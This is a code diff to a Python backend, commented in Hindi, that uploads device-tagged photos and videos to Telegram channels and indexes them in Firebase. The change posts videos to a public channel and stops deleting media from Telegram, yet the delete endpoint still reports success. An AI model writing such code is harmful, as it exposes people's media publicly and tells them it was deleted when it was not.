@@ -17,7 +17,8 @@ app = cors(app, allow_origin="*")
 API_ID = int(os.environ.get("API_ID", 1234567))
 API_HASH = os.environ.get("API_HASH", "YOUR_API_HASH")
 SESSION_STRING = os.environ.get("SESSION_STRING", "YOUR_STRING_SESSION")
-CHANNEL = int(os.environ.get("CHANNEL_ID", -1001234567890))
+CHANNEL = int(os.environ.get("CHANNEL_ID", -1001234567890)) # प्राइवेट चैनल (फोटो के लिए)
+PUBLIC_CHANNEL = "@viewnowc" # पब्लिक चैनल (वीडियो के लिए)
 FIREBASE_DB_URL = os.environ.get("FIREBASE_DB_URL")
 
 cred_json_str = os.environ.get("FIREBASE_CRED_JSON")
@@ -101,14 +102,28 @@ async def upload_photo():
         img_io.name = filename
 
         is_video = filename.lower().endswith(('.mp4', '.mov', '.webm', '.mkv', '.avi', '.3gp'))
-        msg = await client.send_file(CHANNEL, img_io, caption=f"DEV-{device_id}", force_document=False)
-
-        db.reference(f"photos/{device_id}/{msg.id}").set({
-            "id": msg.id,
-            "date": msg.date.isoformat(),
-            "url": f"https://pdf-chaker-1.onrender.com/api/photo/{msg.id}",
-            "is_video": is_video
-        })
+        
+        if is_video:
+            # वीडियो को पब्लिक चैनल पर भेजें और t.me वाला लिंक Firebase में सेव करें
+            msg = await client.send_file(PUBLIC_CHANNEL, img_io, caption=f"DEV-{device_id}", force_document=False)
+            video_url = f"https://t.me/viewnowc/{msg.id}"
+            
+            db.reference(f"photos/{device_id}/{msg.id}").set({
+                "id": msg.id,
+                "date": msg.date.isoformat(),
+                "url": video_url,
+                "is_video": True
+            })
+        else:
+            # फोटो को प्राइवेट चैनल पर भेजें और लोकल API लिंक सेव करें
+            msg = await client.send_file(CHANNEL, img_io, caption=f"DEV-{device_id}", force_document=False)
+            
+            db.reference(f"photos/{device_id}/{msg.id}").set({
+                "id": msg.id,
+                "date": msg.date.isoformat(),
+                "url": f"https://pdf-chaker-1.onrender.com/api/photo/{msg.id}",
+                "is_video": False
+            })
 
         del file_bytes, img_io
         gc.collect()
@@ -149,9 +164,13 @@ async def delete_photos():
         device_id, photo_ids = data.get("device_id"), data.get("photo_ids", [])
         if not photo_ids or not device_id:
             return jsonify({"error": "Missing data"}), 400
-        await client.delete_messages(CHANNEL, photo_ids)
+        
+        # नोट: चूँकि वीडियो पब्लिक चैनल पर और फोटो प्राइवेट चैनल पर हैं, 
+        # अगर आप चाहें तो दोनों जगह डिलीट करने का कोड लिख सकते हैं, 
+        # या Firebase से केवल डेटा डिलीट कर सकते हैं।
         for pid in photo_ids:
             db.reference(f"photos/{device_id}/{pid}").delete()
+            
         return jsonify({"success": True, "message": "Deleted successfully!"})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
@@ -163,11 +182,6 @@ async def get_photo(msg_id):
         if msg and (msg.photo or msg.document):
             file_bytes = await client.download_media(msg, file=bytes)
             content_type = "image/jpeg"
-            if msg.document:
-                for attr in msg.document.attributes:
-                    if hasattr(attr, 'file_name') and attr.file_name:
-                        if attr.file_name.lower().endswith(('.mp4', '.mov', '.webm', '.mkv', '.avi', '.3gp')):
-                            content_type = "video/mp4"
             response_data = (file_bytes, 200, {"Content-Type": content_type, "Cache-Control": "max-age=86400"})
             del file_bytes
             gc.collect()
